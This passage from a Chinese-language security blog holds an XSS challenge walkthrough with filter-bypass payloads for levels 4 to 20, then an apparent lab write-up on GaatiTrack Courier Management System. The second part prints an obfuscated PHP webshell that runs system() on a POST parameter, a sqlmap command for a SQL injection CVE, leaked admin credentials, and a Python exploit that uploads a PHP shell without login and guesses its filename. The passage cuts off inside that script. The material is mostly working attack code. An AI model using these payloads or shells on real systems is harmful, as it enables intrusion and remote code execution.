alt="image-20240905223056342"></p><p>html实体编码+单引号闭合</p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot; onfocus=javascript:alert() &quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905223448606.png" alt="image-20240905223448606"></p><p>尖括号过滤+html实体编码+双引号闭合</p><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>href<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905223715662.png" alt="image-20240905223715662"></p><p>小写转换+script 、on过滤</p><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">sCript</span>&gt;</span> &lt;&quot;<br>&quot; Onfocus=javascript:alert() &quot;<br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>Herf<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905224001359.png" alt="image-20240905224001359"></p><p>过滤掉一堆字符，但没有大小写，可以用大小写绕过</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; /&gt;<span class="hljs-tag">&lt;<span class="hljs-name">sscriptcript</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">sscriptcript</span>&gt;</span>//<br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hrehreff</span>=<span class="hljs-string">javasscriptcript:alert()</span>&gt;</span>HHerf<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240905224319770.png" alt="image-20240905224319770"></p><p>小写转换+一堆字符过滤，双拼写绕过</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;    #href的隐藏属性自动Unicode解码<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906151712103.png" alt="image-20240906151712103"></p><p>html实体转化+小写转换+src、data、onfocus、href、script、双引号过滤</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/* http:// */</span>              #注释http，以便弹窗<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906152229719.png" alt="image-20240906152229719"></p><p>前面一关添加了http检测，插入指定内容（<a href="http://）绕过检测">http://）绕过检测</a></p><h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906152505456.png" alt="image-20240906152505456"></p><p>过滤掉尖括号+输入框隐藏，用onfocus+加上type=”text显示</p><h1 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h1><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Referer:</span> <span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span><span class="hljs-keyword">text</span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906152838728.png" alt="image-20240906152838728"></p><p>Referer传参+尖括号过滤+html实体转码</p><h1 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h1><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906153404992.png" alt="image-20240906153404992"></p><p>与上一关同理，传参换成UAt头</p><h1 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h1><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">user</span><span class="hljs-operator">=</span><span class="hljs-string">&quot; onclick=alert() type=&quot;</span>text <br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906153628967.png" alt="image-20240906153628967"></p><p>同时，cookie中user传参</p><h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><p>图片EXIF注入，上传一个属性里面含有xss代码的图片</p><p><img src="/2024/09/05/XSS-writeup/image-20240906165226579.png" alt="image-20240906165226579"></p><p>设置修改level14.php中的src</p><p><img src="/2024/09/05/XSS-writeup/image-20240906165626203.png" alt="image-20240906165626203"></p><p>给足权限，设置index.php，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="hljs-string">&lt;title&gt;欢迎来到level14&lt;/title&gt;</span><br><span class="hljs-string">&lt;/head&gt; </span><br><span class="hljs-string">&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=&quot;./index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">&lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>        <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br><br>        <span class="hljs-keyword">if</span> (((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/gif&quot;</span>)<br>        || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpeg&quot;</span>)<br>        || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpg&quot;</span>)<br>        || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/pjpeg&quot;</span>)<br>        || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/x-png&quot;</span>)<br>        || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/png&quot;</span>))<br>        &amp;&amp; (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &gt; <span class="hljs-number">204800</span>) <span class="hljs-comment">// 小于 200 kb</span><br>        &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误：: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件名: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-string">&#x27;uploads&#x27;</span>)) &#123;<br>                    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;uploads&#x27;</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>                &#125;<br>                <span class="hljs-variable">$filePath</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>                <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$filePath</span>);<br><br>                <span class="hljs-comment">// 读取EXIF信息</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filePath</span>)) &#123;<br>                    <span class="hljs-variable">$exif</span> = <span class="hljs-title function_ invoke__">exif_read_data</span>(<span class="hljs-variable">$filePath</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h4&gt;[ &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; ]的EXIF信息:&lt;/h4&gt;&quot;</span>;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$exif</span>) &#123;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$exif</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$section</span>) &#123;<br>                            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$section</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>                                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$key</span>.<span class="hljs-subst">$name</span>: <span class="hljs-subst">$val</span>&lt;br /&gt;\n&quot;</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;没有找到EXIF信息。&lt;br&gt;&quot;</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件不存在。&lt;br&gt;&quot;</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;非法的文件格式或文件过大。&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;./level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906170339779.png" alt="image-20240906170339779"></p><p>ng-include文件包涵</p><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">keyword</span>=&lt;svg%0Aonload=alert(1)&gt;<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906170440940.png" alt="image-20240906170440940"></p><p>小写转换+空格实体化，回车代替空格绕过</p><h1 id="level-17-18"><a href="#level-17-18" class="headerlink" title="level 17/18"></a>level 17/18</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=a&amp;arg02=b <span class="hljs-attribute">onmouseover</span>=alert(1)<br></code></pre></td></tr></table></figure><p><img src="/2024/09/05/XSS-writeup/image-20240906170740131.png" alt="image-20240906170740131"></p><p>闭合属性事件触发</p><h1 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=version&amp;arg02=&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:alert()&quot;</span>&gt;here&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>Flash xss</p><h1 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h1><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?arg01=id<span class="hljs-meta">&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(1)&#125;<span class="hljs-comment">//%26width=123%26height=123</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>gaatitrack</title>
    <link href="/2024/07/29/gaatitrack/"/>
    <url>/2024/07/29/gaatitrack/</url>
    
    <content type="html"><![CDATA[<h1 id="gaatitrack"><a href="#gaatitrack" class="headerlink" title="gaatitrack"></a>gaatitrack</h1><h2 id="漏洞1：免杀混淆马"><a href="#漏洞1：免杀混淆马" class="headerlink" title="漏洞1：免杀混淆马"></a>漏洞1：免杀混淆马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">goto</span> PFBx1; CEKfL: <span class="hljs-variable">$WFOjN</span> = <span class="hljs-title function_ invoke__">substr</span>((<span class="hljs-keyword">string</span>) <span class="hljs-variable">$tCGqQ</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>(), <span class="hljs-number">1</span>, <span class="hljs-number">3</span>) . <span class="hljs-title function_ invoke__">substr</span>((<span class="hljs-keyword">string</span>) <span class="hljs-variable">$tCGqQ</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>(), <span class="hljs-number">8</span>); <span class="hljs-keyword">goto</span> i8J9H; PFBx1: <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ssysgametem</span> </span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$u0yA0</span>; &#125; <span class="hljs-keyword">goto</span> cYm2s; VUGem: @(<span class="hljs-variable">$tCGqQ</span>-&gt;u0yA0 = <span class="hljs-variable">$_POST</span>[<span class="hljs-title function_ invoke__">substr</span>((<span class="hljs-keyword">string</span>) <span class="hljs-variable">$tCGqQ</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>(), <span class="hljs-number">4</span>, <span class="hljs-number">4</span>)]); <span class="hljs-keyword">goto</span> CEKfL; cYm2s: <span class="hljs-variable">$tCGqQ</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-string">&quot;\x73\163\x79\x73\x67\141\x6d\x65\164\x65\x6d&quot;</span>); <span class="hljs-keyword">goto</span> VUGem; i8J9H: @<span class="hljs-variable">$WFOjN</span>(<span class="hljs-variable">$tCGqQ</span>-&gt;u0yA0);<br></code></pre></td></tr></table></figure><p>将$WFOjN参数打印出来，发现是system,但是直接打印system函数里的内容tCGqQ-&gt;u0yA0没用,Ctrl+F搜索到通过一个post传参，将里面的内容打印出来，得到system执行的参数game</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> @<span class="hljs-variable">$WFOjN</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">substr</span>((<span class="hljs-keyword">string</span>) <span class="hljs-variable">$tCGqQ</span>-&gt;<span class="hljs-title function_ invoke__">getName</span>(), <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/gaatitrack/4pzcws6b.png" alt="4pzcws6b"></p><p>验证</p><p><img src="/2024/07/29/gaatitrack/image-20240829135433248.png" alt="image-20240829135433248"></p><h2 id="漏洞2：-CVE-2023-48823"><a href="#漏洞2：-CVE-2023-48823" class="headerlink" title="漏洞2： CVE-2023-48823"></a>漏洞2： <a href="https://packetstormsecurity.com/files/cve/CVE-2023-48823">CVE-2023-48823</a></h2><p>/var/www/html/ajax.php中email参数存在sql盲注,详细<a href="https://packetstormsecurity.com/files/176030/GaatiTrack-Courier-Management-System-1.0-SQL-Injection.html">GaatiTrack Courier Management System 1.0 SQL Injection ≈ Packet Storm (packetstormsecurity.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3">python3 sqlmap.py -u &quot;http://192.168.232.133:7001/ajax.php?action=login&quot;  --data=&quot;email=test%40&quot;   -a   --batch<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/gaatitrack/image-20240828220128460.png" alt="image-20240828220128460"></p><h2 id="漏洞3：后台账户密码泄露"><a href="#漏洞3：后台账户密码泄露" class="headerlink" title="漏洞3：后台账户密码泄露"></a>漏洞3：后台账户密码泄露</h2><p>网站子目录Credentials下username and password.txt存在账户密码</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">Username : <span class="hljs-type">mayuri.infospace</span>@gmail.com<br>Password : <span class="hljs-type">admin</span><br></code></pre></td></tr></table></figure><h2 id="漏洞4：后台任意文件上传"><a href="#漏洞4：后台任意文件上传" class="headerlink" title="漏洞4：后台任意文件上传"></a>漏洞4：后台任意文件上传</h2><p>后台管理账户管理处存在任意文件上传</p><p><img src="/2024/07/29/gaatitrack/image-20240829120821581.png" alt="image-20240829120821581"></p><p>生成时间戳+‘_’+文件名的木马，poc如下，无需登录</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>ip<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://192.168.232.133:7001/&quot;</span><br>burp0_url <span class="hljs-operator">=</span> ip<span class="hljs-operator">+</span><span class="hljs-string">&quot;/ajax.php?action=update_user&quot;</span><br>burp0_headers <span class="hljs-operator">=</span> &#123;<span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <span class="hljs-string">&quot;X-Requested-With&quot;</span>: <span class="hljs-string">&quot;XMLHttpRequest&quot;</span>, <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;multipart/form-data; boundary=----WebKitFormBoundary8BMXafUA11P6WdIS&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://192.168.232.133:7001&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://192.168.232.133:7001/index.php?page=home&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<br>burp0_data <span class="hljs-operator">=</span> <span class="hljs-string">&quot;------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>id<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>firstname<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Mayuri K<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>lastname<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>K<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>email<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>mayuri.infospace@gmail.com<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>password<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Disposition: form-data; name=<span class="hljs-subst">\&quot;</span>img<span class="hljs-subst">\&quot;</span>; filename=<span class="hljs-subst">\&quot;</span>1.php<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Type: application/octet-stream<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&lt;?php @system($_POST[&#x27;a&#x27;]);?&gt;<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>------WebKitFormBoundary8BMXafUA11P6WdIS--<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span><br>res<span class="hljs-operator">=</span>requests.post(burp0_url, headers<span class="hljs-operator">=</span>burp0_headers,  data<span class="hljs-operator">=</span>burp0_data)<br>t<span class="hljs-operator">=</span>int(time.time())<br><span class="hljs-built_in">print</span>(t)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):<br>    url<span class="hljs-operator">=</span>ip<span class="hljs-operator">+</span>&#x27;assets<span class="hljs-regexp">/uploads/</span>&#x27;<span class="hljs-operator">+</span>str(t<span class="hljs-operator">-</span>i)<span class="hljs-operator">+</span>&#x27;_1.php&#x27;<br>    #<span class="hljs-built_in">print</span>(url)<br>    data<span 